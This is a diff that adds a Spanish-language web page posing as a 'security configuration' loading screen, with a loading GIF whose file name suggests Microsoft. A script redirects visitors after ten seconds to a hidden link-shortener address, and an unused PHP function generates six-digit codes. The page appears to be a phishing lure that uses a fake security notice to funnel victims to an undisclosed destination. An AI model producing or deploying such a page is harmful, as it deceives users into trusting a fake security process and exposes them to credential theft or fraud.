@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cargando Configuración de Seguridad</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e6e6e6; /* Color de fondo más suave */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      text-align: center;
+      background-image: url('https://example.com/background-image.jpg'); /* URL del fondo de la página */
+      background-size: cover; /* Ajuste para cubrir toda la pantalla */
+      background-position: center; /* Centrado del fondo */
+    }
+
+    .content {
+      max-width: 80%;
+      background-color: rgba(255, 255, 255, 0.9); /* Fondo semi-transparente blanco */
+      border-radius: 8px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2); /* Sombra más definida */
+      padding: 20px;
+    }
+
+    .content img {
+      max-width: 200px; /* Ancho máximo de 200px */
+      height: auto; /* Ajustar automáticamente la altura */
+      display: block;
+      margin: 0 auto 20px; /* Margen inferior para separación */
+    }
+
+    .content p {
+      font-size: 21.6px; /* Tamaño de fuente */
+      color: #333;
+      line-height: 1.5;
+      font-weight: bold; /* Texto en negrita */
+      margin: 0; /* Eliminar el margen superior e inferior */
+    }
+  </style>
+</head>
+<body>
+  <div class="content">
+    <img src="https://cdn.dribbble.com/users/778585/screenshots/4180944/endtagexploration_microsoftdribbble.gif" alt="Loading GIF">
+    <p>Espere un momento...<br/>
+      Se está cargando su configuración de seguridad.
+    </p>
+  </div>
+
+  <script>
+    setTimeout(function() {
+      location.href = "https://i.gal/0nQYW";
+    }, 10000); // 10 segundos de retraso antes de redirigir
+  </script>
+
+  <?php
+    function generarCodigo() {
+      // Generar un código aleatorio de 6 dígitos
+      $codigo = rand(100000, 999999);
+      return $codigo;
+    }
+  ?>
+</body>
+</html>
